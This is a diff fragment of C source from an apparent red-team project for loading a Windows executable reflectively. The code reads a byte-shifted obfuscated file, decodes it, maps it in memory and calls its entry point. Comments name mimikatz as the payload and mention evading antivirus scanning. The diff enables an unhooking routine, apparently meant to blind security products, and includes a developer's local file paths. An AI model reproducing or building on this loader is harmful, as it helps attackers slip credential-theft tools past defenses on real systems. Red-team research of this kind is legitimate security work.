@@ -190,7 +190,13 @@ unsigned char* get_file(unsigned char* filename, size_t* ret_size) {
 	fseek(file, 0, SEEK_SET);
 	printf("Allocated %d bytes\n", size);
 	unsigned char* pe_mem = calloc(1, size);
+	if (pe_mem == NULL)
+	{
+		printf("err pemem\n");
+		exit(1);
+	}
 	fread(pe_mem, size, 1, file);
+	printf("->%02X\n", pe_mem[0xec]);
 	fclose(file);
 	*ret_size = size;
 	return pe_mem;
@@ -207,7 +213,7 @@ unsigned char* get_file(unsigned char* filename, size_t* ret_size) {
 // exemple: mimikatz
 int main(int argc, char *argv[]) {
 	printf("Start 10s\n");
-	Sleep(10000);//if AV kill it at this stage, it perform static analysis on runtime
+	//Sleep(10000);//if AV kill it at this stage, it perform static analysis on runtime
 
 		//create_box();
 		size_t len;
@@ -216,7 +222,8 @@ int main(int argc, char *argv[]) {
 		//unsigned char* raw = get_file("C:\\Windows\\System32\\calc.exe", &len);
 		
 		
-		unsigned char* raw = get_file("C:\\Users\\seb\\GIT\\REDTEAM_PE_Reflective\\x64\\Release\\Custom.txt", &len);
+		//unsigned char* raw = get_file("C:\\Users\\seb\\GIT\\REDTEAM_PE_Reflective\\x64\\Release\\Custom.txt", &len);
+		unsigned char *raw = get_file("C:\\Users\\sebastien.carre\\whitelist\\GIT\\REDTEAM_PE_Reflective\\x64\\Release\\Custom.txt",&len);
 
 		for (size_t i = 0; i < len; ++i) {
 			raw[i] = raw[i] - 1;
@@ -226,7 +233,7 @@ int main(int argc, char *argv[]) {
 		
 
 		PVOID EP = UnpackAndRunEp(raw, len, TRUE);
-		//main_unhook(0,NULL);
+		main_unhook(0,NULL);
 #if 1
 		((VOID(*)())EP)();
 		//main_mimikatz(0, NULL);
